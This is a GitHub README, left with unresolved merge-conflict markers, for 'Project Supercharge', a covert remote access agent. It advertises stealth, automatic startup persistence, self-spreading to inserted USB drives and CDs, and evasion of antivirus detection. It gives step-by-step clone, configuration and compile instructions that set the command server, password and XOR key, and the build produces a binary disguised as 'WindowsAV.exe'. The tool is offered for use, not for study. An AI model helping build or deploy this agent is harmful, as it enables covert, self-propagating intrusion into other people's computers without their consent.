<<<<<<< HEAD
## Project Supercharge
Project supercharge is a Private Covert Remote Access Agent. The supercharge agent is mainly created to provide remote access to a Computer with Stealth and Persistence. 

---

- [Features](#project-supercharge-features)
- [Installing](#installing)
- [Bugs](#Bugs)
- [Contributing](#Contribute)
- [Contact](#Contact)
- [Deployment](#Deployment)
---

### Project Supercharge Features
Feature | Detail
---|---
System Information | View System Information.
Persistence | Automatically add itself to Startup when first run.
Stealth | Automatically hide itself to a Location when first run.
Spreading | If supercharge agent is running and a USB/CD is inserted, The agent will copy itself over into it.
Message Box | Display a message box.
Encrypted Connection | Your communication is encrypted with a key of your choice.
Password Protection | Even though it's encrypted, It will authenticate with a Password hardcoded in the Agent.
Offline Bot Database | supercharge comes with an Offline Web App you can use to easily view all Agents that ever Connected and when.
Fully Undetectable | The Agent is fully undetectable. As of Windows 10 Version 1903, It is detected as a PUP.
Java check | Check if Java is installed or not (For MISC payload purposes)
Download and Upload files | -
Browse the system, Execute files | -


---

### Installing

##### Prerequisites
*(NOTE : These are installed by setup script)*

- Mingw cross Compiler
- Python 3

```bash
$ git clone https://github.com/quantumkernel/supercharge
$ cd supercharge
$ sudo ./install.sh
```

###### Note : It can run on Windows.


---

### Deployment
1. Go to supercharge/agent and open file ``supercharge.hpp`` EG:
```bash
nano supercharge.hpp
```
2. Edit the Line `SERVER_HOST` and `SERVER_PORT` and the `PASSWORD`. EG:
```bash
#define PASSWORD "mysecretpassword" 
#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 3982 
```
**Make sure the password is the same you define in ``supercharge.ini``. (Server side)**

3. Go to supercharge/agent and openfile ``xor.cpp`` EG:
```bash
nano xor.cpp
```

4 Edit line (4) which contains the Encryption key. For Example.
```cpp
std::string XOR(std::string data) {
    // Encryption KEY BELOW
    char key[] = {'M','Y','K','E','Y'};
    // DONT FORGET TO SET !
    std::string output = data;
    
    for (int i = 0; i < data.size(); i++){
        output[i] = data[i] ^ key[i % (sizeof(key) / sizeof(char))];
    }
    return output;
}
```
5. Compile the Agent
**On Windows**
```bash
make
```
**On Linux**
```bash
make linux
```

This will generate the Supercharge agent named ``WindowsAV.exe`` with a Windows ICON.


#### Server Side Settings
1. Setting the Encryption key.
Open file ``kernel/infodb.py`` in your text editor and edit line 31 to your encryption key. It can be anything.
For Example. 
```bash
$ cd supercharge
$ nano kernel/infodb.py
```

```python
def xor(data):
    # Encryption KEY! EDIT ME !
    key = ['M','Y','K','E','Y']
    # Encryption key ABOVE!
    output = []
    for i in range(len(data)):
        xor_num = ord(data[i]) ^ ord(key[i % len(key)])
        output.append(chr(xor_num))
    return ''.join(output)
```

2. Setting the Password.
Open file ``supercharge.ini`` and you can just simply change the values.

### Bugs 
**Fixed**
- Broken Connection Problems. :heavy_check_mark:
- Password Authentication buffer overflow. :heavy_check_mark:
- Remove wchar_t functions (Old code) :heavy_check_mark:
- File Execution bug. :heavy_check_mark:
- File Download byte bug. :heavy_check_mark:

**Not Fixed**
- Windows 10 detected as Windows 8.

### Contribute
If you would like to help me! Please do so! Also, I do not use branches because I always end up pushing to master. So, I always create another repositroy (private) for developement. So if you would like to help me, [Contact](#Contact) me.

#### Help Wanted : 
- [ ] A New Logo. I made [this](https://github.com/quantumkernel/supercharge/blob/master/img/logo.png) . Ain't my desiging skills sick!?

### Contact 
- [Discord](https://discordapp.com/invite/8snh7nx)
- [Website](https://quantumkernel.github.io)
=======
# supercharge
Fully Undetectable Remote Access Agent.
>>>>>>> de1513bff003dc15f2de2c512b289920bffedaa1
